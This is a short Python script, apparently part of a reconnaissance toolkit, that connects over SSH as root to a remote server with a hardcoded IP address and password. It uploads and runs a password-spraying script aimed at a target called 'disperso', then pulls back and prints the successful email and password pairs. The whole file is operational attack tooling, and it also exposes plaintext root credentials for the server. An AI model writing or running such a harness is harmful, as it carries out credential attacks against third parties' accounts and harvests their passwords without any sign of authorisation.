#!/usr/bin/env python3
import paramiko, json

VPS, USER, PASS = "216.238.94.45", "root", "F5v-Sr!@GZ@5P4#E"
LOCAL = r"c:\xampp\htdocs\pentagi\disperso_recon\disperso_soporte_spray.py"
REMOTE = "/root/disperso_soporte_spray.py"
OUT_R = "/root/disperso_spray_results.json"
OUT_L = r"c:\xampp\htdocs\pentagi\disperso_recon\disperso_spray_results.json"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username=USER, password=PASS, timeout=30)
sftp = ssh.open_sftp(); sftp.put(LOCAL, REMOTE); sftp.close()
print("[*] Uploaded — running spray...")
_, stdout, _ = ssh.exec_command(f"python3 {REMOTE} 2>&1", timeout=1800)
for line in iter(stdout.readline, ""): print(line.rstrip())
print(f"Exit: {stdout.channel.recv_exit_status()}")
try:
    sftp = ssh.open_sftp(); sftp.get(OUT_R, OUT_L); sftp.close()
    d = json.load(open(OUT_L))
    print(f"\n=== HITS: {len(d.get('hits',[]))} ===")
    for h in d.get("hits",[]): print(f"  {h['email']}:{h['password']}")
except Exception as e: print(f"[!] {e}")
ssh.close()
